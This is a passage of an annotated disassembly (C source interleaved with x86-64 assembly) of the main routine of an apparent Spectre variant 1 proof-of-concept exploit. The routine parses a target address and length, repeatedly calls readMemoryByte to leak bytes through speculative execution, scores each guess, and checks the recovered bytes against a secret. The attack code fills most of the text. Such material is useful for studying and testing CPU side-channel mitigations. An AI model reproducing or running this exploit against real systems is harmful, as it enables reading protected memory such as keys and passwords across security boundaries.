 c4e:	e8 1d fa ff ff       	callq  670 <strlen@plt>
 c53:	89 45 cc             	mov    %eax,-0x34(%rbp)
  uint8_t value[2];
  int matched = 0;
 c56:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%rbp)
  int total = 0;
 c5d:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%rbp)
  int test_success = 0;
 c64:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)

  for (i = 0; i < 2; i++)
 c6b:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%rbp)
 c72:	eb 15                	jmp    c89 <main+0x7e>
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
 c74:	8b 45 d0             	mov    -0x30(%rbp),%eax
 c77:	48 63 d0             	movslq %eax,%rdx
 c7a:	48 8d 05 ff 18 20 00 	lea    0x2018ff(%rip),%rax        # 202580 <array2>
 c81:	c6 04 02 01          	movb   $0x1,(%rdx,%rax,1)
  for (i = 0; i < 2; i++)
 c85:	83 45 d0 01          	addl   $0x1,-0x30(%rbp)
 c89:	83 7d d0 01          	cmpl   $0x1,-0x30(%rbp)
 c8d:	7e e5                	jle    c74 <main+0x69>
  if (argc == 3) {
 c8f:	83 7d bc 03          	cmpl   $0x3,-0x44(%rbp)
 c93:	75 5b                	jne    cf0 <main+0xe5>
    sscanf(argv[1], "%p", (void * * )( & malicious_x));
 c95:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
 c99:	48 83 c0 08          	add    $0x8,%rax
 c9d:	48 8b 00             	mov    (%rax),%rax
 ca0:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
 ca4:	48 8d 35 4d 02 00 00 	lea    0x24d(%rip),%rsi        # ef8 <_IO_stdin_used+0x18>
 cab:	48 89 c7             	mov    %rax,%rdi
 cae:	b8 00 00 00 00       	mov    $0x0,%eax
 cb3:	e8 e8 f9 ff ff       	callq  6a0 <__isoc99_sscanf@plt>
    malicious_x -= (size_t) array1; /* Convert input value into a pointer */
 cb8:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
 cbc:	48 8d 05 7d 13 20 00 	lea    0x20137d(%rip),%rax        # 202040 <array1>
 cc3:	48 29 c2             	sub    %rax,%rdx
 cc6:	48 89 d0             	mov    %rdx,%rax
 cc9:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    sscanf(argv[2], "%d", & len);
 ccd:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
 cd1:	48 83 c0 10          	add    $0x10,%rax
 cd5:	48 8b 00             	mov    (%rax),%rax
 cd8:	48 8d 55 cc          	lea    -0x34(%rbp),%rdx
 cdc:	48 8d 35 18 02 00 00 	lea    0x218(%rip),%rsi        # efb <_IO_stdin_used+0x1b>
 ce3:	48 89 c7             	mov    %rax,%rdi
 ce6:	b8 00 00 00 00       	mov    $0x0,%eax
 ceb:	e8 b0 f9 ff ff       	callq  6a0 <__isoc99_sscanf@plt>
  }

  printf("Reading %d bytes:\n", len);
 cf0:	8b 45 cc             	mov    -0x34(%rbp),%eax
 cf3:	89 c6                	mov    %eax,%esi
 cf5:	48 8d 3d 02 02 00 00 	lea    0x202(%rip),%rdi        # efe <_IO_stdin_used+0x1e>
 cfc:	b8 00 00 00 00       	mov    $0x0,%eax
 d01:	e8 8a f9 ff ff       	callq  690 <printf@plt>
  while (--len >= 0) {
 d06:	e9 f8 00 00 00       	jmpq   e03 <main+0x1f8>
    printf("Attempting Confirmation %p ", (void * ) malicious_x);
 d0b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 d0f:	48 89 c6             	mov    %rax,%rsi
 d12:	48 8d 3d f8 01 00 00 	lea    0x1f8(%rip),%rdi        # f11 <_IO_stdin_used+0x31>
 d19:	b8 00 00 00 00       	mov    $0x0,%eax
 d1e:	e8 6d f9 ff ff       	callq  690 <printf@plt>
    readMemoryByte(malicious_x++, value, score);
 d23:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 d27:	48 8d 50 01          	lea    0x1(%rax),%rdx
 d2b:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
 d2f:	48 8d 55 ec          	lea    -0x14(%rbp),%rdx
 d33:	48 8d 4d f6          	lea    -0xa(%rbp),%rcx
 d37:	48 89 ce             	mov    %rcx,%rsi
 d3a:	48 89 c7             	mov    %rax,%rdi
 d3d:	e8 d5 fa ff ff       	callq  817 <readMemoryByte>
    printf("%s: ", (score[0] >= 2 * score[1] ? "Confirmed" : "Unconfirmed"));
 d42:	8b 45 ec             	mov    -0x14(%rbp),%eax
 d45:	8b 55 f0             	mov    -0x10(%rbp),%edx
 d48:	01 d2                	add    %edx,%edx
 d4a:	39 d0                	cmp    %edx,%eax
 d4c:	7c 09                	jl     d57 <main+0x14c>
 d4e:	48 8d 05 d8 01 00 00 	lea    0x1d8(%rip),%rax        # f2d <_IO_stdin_used+0x4d>
 d55:	eb 07                	jmp    d5e <main+0x153>
 d57:	48 8d 05 d9 01 00 00 	lea    0x1d9(%rip),%rax        # f37 <_IO_stdin_used+0x57>
 d5e:	48 89 c6             	mov    %rax,%rsi
 d61:	48 8d 3d db 01 00 00 	lea    0x1db(%rip),%rdi        # f43 <_IO_stdin_used+0x63>
 d68:	b8 00 00 00 00       	mov    $0x0,%eax
 d6d:	e8 1e f9 ff ff       	callq  690 <printf@plt>
    printf("0x%02X=’%c’ score=%d ", value[0],
 d72:	8b 55 ec             	mov    -0x14(%rbp),%edx
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
 d75:	0f b6 45 f6          	movzbl -0xa(%rbp),%eax
    printf("0x%02X=’%c’ score=%d ", value[0],
 d79:	3c 1f                	cmp    $0x1f,%al
 d7b:	76 11                	jbe    d8e <main+0x183>
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
 d7d:	0f b6 45 f6          	movzbl -0xa(%rbp),%eax
 d81:	3c 7e                	cmp    $0x7e,%al
 d83:	77 09                	ja     d8e <main+0x183>
 d85:	0f b6 45 f6          	movzbl -0xa(%rbp),%eax
    printf("0x%02X=’%c’ score=%d ", value[0],
 d89:	0f b6 c0             	movzbl %al,%eax
 d8c:	eb 05                	jmp    d93 <main+0x188>
 d8e:	b8 3f 00 00 00       	mov    $0x3f,%eax
 d93:	0f b6 4d f6          	movzbl -0xa(%rbp),%ecx
 d97:	0f b6 f1             	movzbl %cl,%esi
 d9a:	89 d1                	mov    %edx,%ecx
 d9c:	89 c2                	mov    %eax,%edx
 d9e:	48 8d 3d a3 01 00 00 	lea    0x1a3(%rip),%rdi        # f48 <_IO_stdin_used+0x68>
 da5:	b8 00 00 00 00       	mov    $0x0,%eax
 daa:	e8 e1 f8 ff ff       	callq  690 <printf@plt>
    if (score[1] > 0)
 daf:	8b 45 f0             	mov    -0x10(%rbp),%eax
 db2:	85 c0                	test   %eax,%eax
 db4:	7e 1d                	jle    dd3 <main+0x1c8>
      printf("(Alt: 0x%02X score=%d)", value[1], score[1]);
 db6:	8b 55 f0             	mov    -0x10(%rbp),%edx
 db9:	0f b6 45 f7          	movzbl -0x9(%rbp),%eax
 dbd:	0f b6 c0             	movzbl %al,%eax
 dc0:	89 c6                	mov    %eax,%esi
 dc2:	48 8d 3d 99 01 00 00 	lea    0x199(%rip),%rdi        # f62 <_IO_stdin_used+0x82>
 dc9:	b8 00 00 00 00       	mov    $0x0,%eax
 dce:	e8 bd f8 ff ff       	callq  690 <printf@plt>
    printf("\n");
 dd3:	bf 0a 00 00 00       	mov    $0xa,%edi
 dd8:	e8 83 f8 ff ff       	callq  660 <putchar@plt>

    char predicted = (char)value[0];
 ddd:	0f b6 45 f6          	movzbl -0xa(%rbp),%eax
 de1:	88 45 cb             	mov    %al,-0x35(%rbp)
    if (predicted == secret[total]) matched++;
 de4:	48 8b 15 f5 12 20 00 	mov    0x2012f5(%rip),%rdx        # 2020e0 <secret>
 deb:	8b 45 d8             	mov    -0x28(%rbp),%eax
 dee:	48 98                	cltq   
 df0:	48 01 d0             	add    %rdx,%rax
 df3:	0f b6 00             	movzbl (%rax),%eax
 df6:	38 45 cb             	cmp    %al,-0x35(%rbp)
 df9:	75 04                	jne    dff <main+0x1f4>
 dfb:	83 45 d4 01          	addl   $0x1,-0x2c(%rbp)
    total++;
 dff:	83 45 d8 01          	addl   $0x1,-0x28(%rbp)
  while (--len >= 0) {
 e03:	8b 45 cc             	mov    -0x34(%rbp),%eax
 e06:	83 e8 01             	sub    $0x1,%eax
 e09:	89 45 cc             	mov    %eax,-0x34(%rbp)
 e0c:	8b 45 cc             	mov    -0x34(%rbp),%eax
 e0f:	85 c0                	test   %eax,%eax
 e11:	0f 89 f4 fe ff ff    	jns    d0b <main+0x100>

  }

  if (matched * 2 >= total)
 e17:	8b 45 d4             	mov    -0x2c(%rbp),%eax
 e1a:	01 c0                	add    %eax,%eax
 e1c:	39 45 d8             	cmp    %eax,-0x28(%rbp)
 e1f:	7f 07                	jg     e28 <main+0x21d>
        test_success = 1;
 e21:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%rbp)
  printf("[Result] success=%d, matched=%d/%d\n", test_success, matched, total);
 e28:	8b 4d d8             	mov    -0x28(%rbp),%ecx
 e2b:	8b 55 d4             	mov    -0x2c(%rbp),%edx
 e2e:	8b 45 dc             	mov    -0x24(%rbp),%eax
 e31:	89 c6                	mov    %eax,%esi
 e33:	48 8d 3d 46 01 00 00 	lea    0x146(%rip),%rdi        # f80 <_IO_stdin_used+0xa0>
 e3a:	b8 00 00 00 00       	mov    $0x0,%eax
 e3f:	e8 4c f8 ff ff       	callq  690 <printf@plt>

  return test_success;
 e44:	8b 45 dc             	mov    -0x24(%rbp),%eax
 e47:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
 e4b:	64 48 33 0c 25 28 00 	xor    %fs:0x28,%rcx
 e52:	00 00 
 e54:	74 05                	je     e5b <main+0x250>
 e56:	e8 25 f8 ff ff       	callq  680 <__stack_chk_fail@plt>
 e5b:	c9                   	leaveq 
 e5c:	c3                   	retq   
 e5d:	0f 1f 00             	nopl   (%rax)

0000000000000e60 <__libc_csu_init>:
 e60:	41 57                	push   %r15
 e62:	41 56                	push   %r14
 e64:	49 89 d7             	mov    %rdx,%r15
 e67:	41 55                	push   %r13
 e69:	41 54                	push   %r12
 e6b:	4c 8d 25 26 0f 20 00 	lea    0x200f26(%rip),%r12        # 201d98 <__frame_dummy_init_array_entry>
 e72:	55                   	push   %rbp
 e73:	48 8d 2d 26 0f 20 00 	lea    0x200f26(%rip),%rbp        # 201da0 <__init_array_end>
 e7a:	53                   	push   %rbx
 e7b:	41 89 fd             	mov    %edi,%r13d
 e7e:	49 89 f6             	mov    %rsi,%r14
 e81:	4c 29 e5             	sub    %r12,%rbp
 e84:	48 83 ec 08          	sub    $0x8,%rsp
 e88:	48 c1 fd 03          	sar    $0x3,%rbp
 e8c:	e8 9f f7 ff ff       	callq  630 <_init>
 e91:	48 85 ed             	test   %rbp,%rbp
 e94:	74 20                	je     eb6 <__libc_csu_init+0x56>
 e96:	31 db                	xor    %ebx,%ebx
 e98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 e9f:	00 
 ea0:	4c 89 fa             	mov    %r15,%rdx
 ea3:	4c 89 f6             	mov    %r14,%rsi
 ea6:	44 89 ef             	mov    %r13d,%edi
 ea9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 ead:	48 83 c3 01          	add    $0x1,%rbx
 eb1:	48 39 dd             	cmp    %rbx,%rbp
 eb4:	75 ea                	jne    ea0 <__libc_csu_init+0x40>
 eb6:	48 83 c4 08          	add    $0x8,%rsp
 eba:	5b                   	pop    %rbx
 ebb:	5d                   	pop    %rbp
 ebc:	41 5c                	pop    %r12
 ebe:	41 5d                	pop    %r13
 ec0:	41 5e                	pop    %r14
 ec2:	41 5f                	pop    %r15
 ec4:	c3                   	retq   
 ec5:	90                   	nop
 ec6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 ecd:	00 00 00 

0000000000000ed0 <__libc_csu_fini>:
 ed0:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000ed4 <_fini>:
 ed4:	48 83 ec 08          	sub    $0x8,%rsp
 ed8:	48 83 c4 08          	add    $0x8,%rsp
 edc:	c3                   	retq   
